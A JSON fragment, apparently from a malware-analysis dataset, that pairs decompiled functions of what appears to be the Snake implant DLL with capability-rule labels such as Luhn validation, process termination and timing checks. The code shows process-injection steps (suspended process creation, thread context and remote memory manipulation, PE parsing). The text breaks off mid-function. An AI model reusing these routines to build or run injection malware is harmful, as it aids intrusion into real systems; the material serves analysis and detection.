        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: s\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.2000b306(uint arg_8h, uint arg_ch, uint size)\n\n{\n    code *pcVar1;\n    int32_t arg_18h;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint s;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_18h = (*_sym.imp.msvcrt.dll_malloc)(size);\n    if (arg_18h == 0) {\n        sym.inj_snake_Win32.dll_snake_log(7, 0, 0x21590004, unaff_EBX, arg_8h);\n    }\n    else {\n        iVar2 = sym.inj_snake_Win32.dll_qm_read(0xfffffffe, 6, arg_ch, 0, arg_18h, size, &size);\n        if (iVar2 == 0) {\n            var_ch = 0x20034160;\n            sub.ntdll.dll_memset(&s, 0, 0x15);\n            var_20h = arg_8h;\n            var_1ch._0_1_ = 3;\n            var_4h = 0;\n            var_8h = 0;\n            fcn.20007972(&var_ch, unaff_EBX, arg_18h, size, &var_4h, &var_8h, &s, 0);\n            pcVar1 = _sym.imp.msvcrt.dll_free;\n            (*_sym.imp.msvcrt.dll_free)(arg_18h);\n            (*pcVar1)(var_4h);\n        }\n        else {\n            sym.inj_snake_Win32.dll_snake_log(7, 0, iVar2 + 0x191U | 0x21590000, unaff_EBX, arg_8h);\n            (*_sym.imp.msvcrt.dll_free)(arg_18h);\n        }\n    }\n    return;\n}\n",
        "token_count": 465
    },
    "2000b5ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2000b5ae(void)\n\n{\n    fcn.200012fa(0x20047170);\n    *0x20046e5c = 0;\n    fcn.20001cfb(0x20046e60, 0x2000b584, 0);\n    return;\n}\n",
        "token_count": 71
    },
    "2000b5d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2000b5d4(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_2ch;\n    uint *var_28h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 3;\n    arg_14h = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n    sub.ntdll.dll_memset(&var_ch, 0, 8);\n    var_ch = 5;\n    var_8h = 2;\n    sub.ntdll.dll_memset(&var_2ch, 0, 0x10);\n    var_28h = &arg_14h;\n    var_4h = &var_2ch;\n    var_2ch = 4;\n    sub.ntdll.dll_memset(&var_1ch, 0, 0x10);\n    var_18h = &var_ch;\n    var_10h = &var_4h;\n    var_1ch = 1;\n    var_14h = 1;\n    sym.inj_snake_Win32.dll_code_result_tbl(&var_1ch, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 333
    },
    "2000bb4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.2000bb4a(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_54h;\n    uint var_50h;\n    uint var_14h;\n    int16_t *var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.2000d580(arg_10h, 3, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_1h._0_1_ = '\\0';\n    fcn.2000d5bb(arg_10h, 0x15, 1, &var_1h, 1);\n    if (*var_8h == 0x26) {\n        if (var_1h != '\\0') goto code_r0x2000bba8;\n        var_8h = var_8h + 1;\n        var_1h._0_1_ = '\\x01';\n    }\n    if (var_1h == '\\0') {\n        iVar1 = (*_sym.imp.msvcrt.dll__wunlink)(var_8h);\n        if (-1 < iVar1) {\n            return 0;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return uVar2;\n    }\ncode_r0x2000bba8:\n    var_14h = (*_sym.imp.ntdll.dll_wcstoul)(var_8h, &var_10h, 0);\n    if (*var_10h != 0) {\n        return 0x21590065;\n    }\n    uVar2 = fcn.20007c3b(&var_ch);\n    if (uVar2 == 0) {\n        iVar1 = sym.inj_snake_Win32.dll_qm_find_first(var_ch, 3, &var_14h, &var_54h);\n        if ((iVar1 == 0) && (iVar1 = sym.inj_snake_Win32.dll_qm_rm(var_ch, 3, var_50h),  iVar1 == 0)) {\n            return 0;\n        }\n        return iVar1 + 0x191U | 0x21590000;\n    }\n    return uVar2;\n}\n",
        "token_count": 571
    },
    "2000bee2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate process"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000bee2(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.2000d5bb(arg_10h, 2, 2, &var_4h, 4);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    uVar3 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, var_4h);\n    if (iVar1 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 250
    },
    "2000d2da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.2000d2da(int32_t s2, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *s1;\n    int32_t *n;\n    uint var_14h;\n    int32_t **var_4h;\n    \n    pcVar2 = _sym.imp.msvcrt.dll_malloc;\n    pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n    var_4h = NULL;\n    if (0x14 < arg_ch) {\n        do {\n            sub.ntdll.dll_memcpy(&s1, s2, 0x15);\n            s1 = (*pcVar1)(s1);\n            n = (*pcVar1)(n);\n            if (arg_ch - 0x15 < n) {\n                return var_4h;\n            }\n            ppiVar3 = (*pcVar2)(0x1c);\n            if (ppiVar3 == NULL) {\n                return var_4h;\n            }\n            sub.ntdll.dll_memset(ppiVar3, 0, 0x1c);\n            ppiVar3[1] = s1;\n            ppiVar3[2] = var_14h;\n            ppiVar3[3] = n;\n            if (n < 0x8) {\n                ppiVar3[4] = ppiVar3 + 5;\n            }\n            else {\n                piVar4 = (*pcVar2)(n);\n                ppiVar3[4] = piVar4;\n                if (piVar4 == NULL) {\n                    ppiVar3[3] = NULL;\n                }\n            }\n            sub.ntdll.dll_memcpy(ppiVar3[4], s2 + 0x15, n);\n            s2 = s2 + 0x15 + n;\n            arg_ch = (arg_ch - 0x15) - n;\n            iVar5 = fcn.2000d6c2(ppiVar3[2], ppiVar3[4], ppiVar3[3]);\n            if (iVar5 == 0) {\n                ppiVar3[3] = NULL;\n            }\n            *ppiVar3 = var_4h;\n            var_4h = ppiVar3;\n        } while (0x14 < arg_ch);\n    }\n    return var_4h;\n}\n",
        "token_count": 552
    },
    "2000d56f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2000d56f(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.2000d3c1(0, 0, param_3);\n    return;\n}\n",
        "token_count": 50
    },
    "2000d5bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000d5bb(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint s1, int32_t arg_18h)\n\n{\n    while( true ) {\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        if (arg_8h[1] == arg_ch) break;\n        arg_8h = *arg_8h;\n    }\n    if (arg_8h[2] != arg_10h) {\n        return 0;\n    }\n    if (arg_8h[3] != arg_18h) {\n        return 0;\n    }\n    sub.ntdll.dll_memcpy(s1, arg_8h[4], arg_8h[3]);\n    return 1;\n}\n",
        "token_count": 177
    },
    "2000d78b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000d78b(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_34h;\n    int32_t var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *ptr;\n    \n    ptr = NULL;\n    if (arg_10h == 0) {\n        uVar1 = 0x21590065;\n    }\n    else {\n        iVar2 = sub.ntdll.dll_ZwQueryInformationProcess(arg_8h, 0, &var_34h, 0x18, 0);\n        if (iVar2 == 0) {\n            uVar1 = fcn.20001658(5, &ptr);\n            if (uVar1 == 0) {\n                uVar1 = 0x21590005;\n                piVar3 = ptr;\n                if (ptr == NULL) {\n                    return 0x21590005;\n                }\n                while ((piVar3[0x11] != var_24h || (piVar3[1] == 0))) {\n                    if ((*piVar3 == 0) || (piVar3 = piVar3 + *piVar3,  piVar3 == NULL)) goto code_r0x2000d833;\n                }\n                var_1ch = 0x18;\n                var_18h = 0;\n                var_10h = 0;\n                var_14h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                iVar2 = (*_sym.imp.ntdll.dll_ZwOpenThread)(arg_10h, arg_ch, &var_1ch, piVar3 + 0x36);\n                uVar1 = -(iVar2 != 0) & 0x21590008;\n            }\n        }\n        else {\n            uVar1 = 0x21590008;\n        }\ncode_r0x2000d833:\n        if (ptr != NULL) {\n            (*_sym.imp.msvcrt.dll_free)(ptr);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 514
    },
    "2000dc93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.2000dc93(int32_t arg_8h, uint s2, uint32_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *extraout_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = *(arg_8h + 0x3c) + arg_8h;\n    uVar2 = *(iVar4 + 0x38);\n    var_8h = fcn.2000dad4(*(iVar4 + 0x54), uVar2);\n    uVar3 = 0;\n    iVar5 = *(iVar4 + 0x14) + 0x18 + iVar4;\n    if (*(iVar4 + 6) != 0) {\n        do {\n            iVar1 = (*_sym.imp.ntdll.dll_strncmp)(iVar5, s2, 8);\n            if (iVar1 == 0) {\n                if (arg_10h != NULL) {\n                    *arg_10h = uVar3;\n                }\n                if (arg_14h != NULL) {\n                    *arg_14h = iVar5;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_8h + arg_8h;\n                }\n                if (arg_1ch != 0) {\n                    uVar2 = fcn.2000dad4(*(iVar5 + 8), uVar2);\n                    *extraout_ECX = uVar2;\n                }\n                return 0;\n            }\n            iVar1 = fcn.2000dad4(*(iVar5 + 8), uVar2);\n            var_8h = var_8h + iVar1;\n            iVar5 = iVar5 + 0x28;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *(iVar4 + 6));\n    }\n    return 0x21590005;\n}\n",
        "token_count": 480
    },
    "2000dd43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.2000dd43(int16_t *param_1, uint32_t param_2)\n\n{\n    if ((((param_2 == 0) || (0x3f < param_2)) && (*param_1 == 0x5a4d)) &&\n       (((param_2 == 0 || (*(param_1 + 0x1e) + 0xf8U <= param_2)) && (*(param_1 + *(param_1 + 0x1e)) == 0x4550)))) {\n        return 0;\n    }\n    return 0x21590065;\n}\n",
        "token_count": 134
    },
    "2000e156": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.2000e156(int32_t lpApplicationName, int32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, uint *arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ntdll.dll_wcslen;\n    iVar2 = lpApplicationName;\n    if (arg_ch != 0) {\n        iVar2 = (*_sym.imp.ntdll.dll_wcslen)(lpApplicationName);\n        iVar3 = (*pcVar1)(arg_ch);\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)((iVar2 + iVar3) * 2 + 4);\n        if (iVar2 == 0) {\n            return 0x21590004;\n        }\n        (*_sym.imp.USER32.dll_wsprintfW)(iVar2, L\"%s %s\", lpApplicationName, arg_ch);\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                      (lpApplicationName, iVar2, 0, 0, 0, 0x14, 0, arg_10h, arg_14h, arg_18h);\n    if (iVar3 == 0) {\n        (*_sym.imp.msvcrt.dll_free)(iVar2);\n    }\n    else {\n        if (arg_ch != 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n        }\n        *arg_1ch = 0x10002;\n        iVar2 = (*_sym.imp.ntdll.dll_ZwGetContextThread)(arg_18h[1], arg_1ch);\n        if (iVar2 == 0) {\n            var_4h = 0xffffffff;\n            sub.ntdll.dll_ZwSetInformationProcess(*arg_18h, 0xc, &var_4h, 4);\n            return 0;\n        }\n        (*_sym.imp.ntdll.dll_ZwTerminateProcess)(*arg_18h, 0);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 462
    },
    "2000e224": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000e224(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *in_EAX;\n    var_4h = in_EAX[2];\n    uVar1 = fcn.2000d909(arg_8h, var_8h + 8, 0, &var_4h, 4);\n    if (uVar1 == 0) {\n        uVar1 = fcn.2000d909(arg_8h, var_4h, 0, &var_8h, 4);\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 182
    },
    "2000e270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000e270(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.2000d8f1();\n    if (uVar1 == 0) {\n        uVar1 = fcn.2000d909();\n        if (uVar1 == 0) {\n            uVar1 = fcn.2000d909();\n            if (uVar1 == 0) {\n                uVar1 = fcn.2000d909();\n                if (uVar1 == 0) {\n                    uVar1 = fcn.2000d909();\n                }\n            }\n        }\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 181
    },
    "2000e2ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000e2ff(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *in_EAX;\n    var_4h = in_EAX[1];\n    uVar1 = fcn.2000d909(arg_8h, var_8h + 4, 0, &var_4h, 4);\n    if (uVar1 == 0) {\n        uVar1 = fcn.2000d909(arg_8h, var_4h, 0, &var_8h, 4);\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 183
    },
    "2000e34b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.2000e34b(void)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.2000d8f1();\n    if (uVar1 == 0) {\n        uVar1 = fcn.2000d909();\n        if (uVar1 == 0) {\n            uVar1 = fcn.2000d909();\n            if (uVar1 == 0) {\n                uVar1 = fcn.2000d909();\n                if (uVar1 == 0) {\n                    uVar1 = fcn.2000d909();\n                }\n            }\n        }\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 181
    },
    "2000e3dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.2000e3dd(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_150h;\n    uint var_e8h;\n    uint var_88h;\n    uint var_54h;\n    uint var_20h;\n    uint var_1ch;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.20011888(0x20032428, 0x140);\n    *(unaff_EBP + -0x20) = 0;\n    puVar1 = *(unaff_EBP + 0xc);\n    if (puVar1 == NULL) goto code_r0x2000e503;\n    iVar2 = fcn.2000d9af(unaff_EBP + -0x20, 0x438, *(unaff_EBP + 8));\n    *(unaff_EBP + -0x1c) = iVar2;\n    if (iVar2 == 0) {\n        iVar2 = fcn.2000d881(*(unaff_EBP + -0x20), unaff_EBP + 0xf);\n        *(unaff_EBP + -0x1c) = iVar2;\n        if (iVar2 == 0) {\n            *(unaff_EBP + -4) = 0;\n            if (*(unaff_EBP + 0xf) == '\\0') {\n                iVar2 = fcn.2000d8f1(*(unaff_EBP + -0x20), *puVar1, 0, unaff_EBP + -0x150, 200);\n                *(unaff_EBP + -0x1c) = iVar2;\n                if (iVar2 == 0) {\n                    *(unaff_EBP + -0xe8) = *(unaff_EBP + -0xe8) & 0xffffefff;\n                    *(unaff_EBP + -0xe8) = *(unaff_EBP + -0xe8) | 0xc4000;\n                    uVar3 = 200;\n                    iVar2 = unaff_EBP + -0x150;\ncode_r0x2000e48d:\n                    iVar2 = fcn.2000d909(*(unaff_EBP + -0x20), *puVar1, 0, iVar2, uVar3);\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    if (iVar2 == 0) {\n                        *(unaff_EBP + -0x1c) = 0;\n                    }\n                }\n            }\n            else {\n                iVar2 = fcn.2000d8f1(*(unaff_EBP + -0x20), *puVar1, 0, unaff_EBP + -0x88, 0x68);\n                *(unaff_EBP + -0x1c) = iVar2;\n                if (iVar2 == 0) {\n                    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) & 0xffffefff;\n                    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) | 0xc4000;\n                    uVar3 = 0x68;\n                    iVar2 = unaff_EBP + -0x88;\n                    goto code_r0x2000e48d;\n                }\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n    }\n    if (*(unaff_EBP + -0x20) != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + -0x20));\n    }\ncode_r0x2000e503:\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 855
    },
    "2000ec72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_19h\n\nvoid __cdecl fcn.2000ec72(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_160h;\n    uint var_144h;\n    uint var_140h;\n    uint var_130h;\n    uint var_120h;\n    uint var_110h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_84h;\n    uint var_80h;\n    uint var_58h;\n    uint var_48h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_4h;\n    \n    fcn.20011888(0x20032448, 0x150);\n    *(unaff_EBP + -0x28) = 0;\n    if (*(unaff_EBP + 0x10) == NULL) goto code_r0x2000ef74;\n    **(unaff_EBP + 0x10) = 0;\n    iVar1 = fcn.2000d9af(unaff_EBP + -0x28, 0x438, *(unaff_EBP + 8));\n    *(unaff_EBP + -0x20) = iVar1;\n    arg_8h_00 = *(unaff_EBP + -0x28);\n    if (iVar1 == 0) {\n        iVar1 = fcn.2000d881(arg_8h_00, unaff_EBP + -0x19);\n        *(unaff_EBP + -0x20) = iVar1;\n        if (iVar1 == 0) {\n            *(unaff_EBP + -0x19) = *(unaff_EBP + -0x19) == '\\0';\n            iVar1 = fcn.2000e856(arg_8h_00, unaff_EBP + -0x24);\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 == 0) {\n                *(unaff_EBP + -4) = 0;\n                if (*(unaff_EBP + -0x19) == '\\0') {\n                    iVar1 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x48, 0x10);\n                    *(unaff_EBP + -0x20) = iVar1;\n                    if (iVar1 == 0) {\n                        iVar1 = *(unaff_EBP + -0x3c);\n                        *(unaff_EBP + -0x24) = iVar1;\n                        if (iVar1 == 0) goto code_r0x2000ed29;\n                        iVar1 = fcn.2000d8f1(arg_8h_00, iVar1, 0, unaff_EBP + -0x144, 0x24);\n                        *(unaff_EBP + -0x20) = iVar1;\n                        if (iVar1 == 0) {\n                            iVar1 = *(unaff_EBP + -0x130);\n                            while (iVar1 != *(unaff_EBP + -0x24) + 0x14) {\n                                iVar2 = fcn.2000d8f1(arg_8h_00, iVar1, 0, unaff_EBP + -0x30, 8);\n                                *(unaff_EBP + -0x20) = iVar2;\n                                if (iVar2 != 0) goto code_r0x2000ed16;\n                                iVar1 = iVar1 + -8;\n                                iVar2 = fcn.2000d8f1(arg_8h_00, iVar1, 0, unaff_EBP + -0xc0, 0x48);\n                                *(unaff_EBP + -0x20) = iVar2;\n                                if (iVar2 != 0) goto code_r0x2000ed16;\n                                if (*(unaff_EBP + -0xa8) == *(unaff_EBP + 0xc)) {\n                                    fcn.2000e2ff(arg_8h_00);\n                                    fcn.2000e2ff(arg_8h_00);\n                                    if ((*(unaff_EBP + -0xb0) != 0) && (*(unaff_EBP + -0xac) != 0)) {\n                                        fcn.2000e2ff(arg_8h_00);\n                                    }\n                                    if ((*(unaff_EBP + -0x80) != 0) && (*(unaff_EBP + -0x84) != 0)) {\n                                        fcn.2000e2ff(arg_8h_00);\n                                    }\n                                    goto code_r0x2000ef2f;\n                                }\n                                iVar1 = *(unaff_EBP + -0x30);\n                            }\ncode_r0x2000ef34:\n                            *(unaff_EBP + -0x20) = (**(unaff_EBP + 0x10) != 0) - 1;\n                        }\n                    }\n                }\n                else {\n                    iVar1 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x58, 0x20);\n                    *(unaff_EBP + -0x20) = iVar1;\n                    if (iVar1 == 0) {\n                        iVar1 = *(unaff_EBP + -0x40);\n                        *(unaff_EBP + -0x24) = iVar1;\n                        if (iVar1 == 0) {\ncode_r0x2000ed29:\n                            *(unaff_EBP + -0x20) = 0xffffffff;\n                        }\n                        else {\n                            iVar1 = fcn.2000d8f1(arg_8h_00, iVar1, 0, unaff_EBP + -0x160, 0x40);\n                            *(unaff_EBP + -0x20) = iVar1;\n                            if (iVar1 == 0) {\n                                iVar1 = *(unaff_EBP + -0x140);\ncode_r0x2000ed50:\n                                if (iVar1 != *(unaff_EBP + -0x24) + 0x20) {\n                                    iVar2 = fcn.2000d8f1(arg_8h_00, iVar1, 0, unaff_EBP + -0x38, 0x10);\n                                    *(unaff_EBP + -0x20) = iVar2;\n                                    if (iVar2 == 0) {\n                                        iVar1 = iVar1 + -0x10;\n                                        iVar2 = fcn.2000d8f1(arg_8h_00, iVar1, 0, unaff_EBP + -0x120, 0x88);\n                                        *(unaff_EBP + -0x20) = iVar2;\n                                        if (iVar2 == 0) {\n                                            if ((*(unaff_EBP + -0xf0) != *(unaff_EBP + 0xc)) ||\n                                               (*(unaff_EBP + -0xec) != 0)) goto code_r0x2000ee2e;\n                                            fcn.2000e224(arg_8h_00);\n                                            fcn.2000e224(arg_8h_00);\n                                            if (((*(unaff_EBP + -0x100) | *(unaff_EBP + -0xfc)) != 0) &&\n                                               ((*(unaff_EBP + -0xf8) | *(unaff_EBP + -0xf4)) != 0)) {\n                                                fcn.2000e224(arg_8h_00);\n                                            }\n                                            if (((*(unaff_EBP + -0xa8) | *(unaff_EBP + -0xa4)) != 0) &&\n                                               ((*(unaff_EBP + -0xb0) | *(unaff_EBP + -0xac)) != 0)) {\n                                                fcn.2000e224(arg_8h_00);\n                                            }\ncode_r0x2000ef2f:\n                                            **(unaff_EBP + 0x10) = iVar1;\n                                            goto code_r0x2000ef34;\n                                        }\n                                    }\n                                    goto code_r0x2000ed16;\n                                }\n                                goto code_r0x2000ef34;\n                            }\n                        }\n                    }\n                }\ncode_r0x2000ed16:\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n        }\n    }\n    if (arg_8h_00 != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(arg_8h_00);\n    }\ncode_r0x2000ef74:\n    fcn.200118c3();\n    return;\ncode_r0x2000ee2e:\n    iVar1 = *(unaff_EBP + -0x38);\n    goto code_r0x2000ed50;\n}\n",
        "token_count": 2113
    },
    "2000f1b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.2000f1b4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_160h;\n    uint var_130h;\n    uint var_100h;\n    uint var_f4h;\n    uint var_e8h;\n    uint var_c8h;\n    uint var_98h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_68h;\n    uint var_58h;\n    uint var_48h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x20032468, 0x150);\n    *(unaff_EBP + -0x28) = 0;\n    if ((*(unaff_EBP + 0xc) == 0) || (*(unaff_EBP + 0x10) == 0)) goto code_r0x2000f3e3;\n    iVar2 = fcn.2000d9af(unaff_EBP + -0x28, 0x410, *(unaff_EBP + 8));\n    *(unaff_EBP + -0x1c) = iVar2;\n    arg_8h_00 = *(unaff_EBP + -0x28);\n    if (iVar2 == 0) {\n        iVar2 = fcn.2000d881(arg_8h_00, unaff_EBP + -0x1d);\n        *(unaff_EBP + -0x1c) = iVar2;\n        if (iVar2 == 0) {\n            *(unaff_EBP + -0x1d) = *(unaff_EBP + -0x1d) == '\\0';\n            iVar2 = fcn.2000e856(arg_8h_00, unaff_EBP + -0x24);\n            *(unaff_EBP + -0x1c) = iVar2;\n            if (iVar2 == 0) {\n                *(unaff_EBP + -4) = 0;\n                if (*(unaff_EBP + -0x1d) == '\\0') {\n                    iVar2 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x48, 0x10);\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    if (iVar2 == 0) {\n                        iVar2 = *(unaff_EBP + -0x3c);\n                        *(unaff_EBP + -0x24) = iVar2;\n                        if (iVar2 == 0) goto code_r0x2000f276;\n                        iVar2 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x7c, 0x24);\n                        *(unaff_EBP + -0x1c) = iVar2;\n                        if (iVar2 == 0) {\n                            iVar2 = *(unaff_EBP + -0x68);\n                            while (iVar2 != *(unaff_EBP + -0x24) + 0x14) {\n                                iVar3 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x30, 8);\n                                *(unaff_EBP + -0x1c) = iVar3;\n                                if (iVar3 != 0) goto code_r0x2000f263;\n                                iVar2 = fcn.2000d8f1(arg_8h_00, iVar2 + -8, 0, unaff_EBP + -0x100, 0x48);\n                                *(unaff_EBP + -0x1c) = iVar2;\n                                if (iVar2 != 0) goto code_r0x2000f263;\n                                if (*(unaff_EBP + 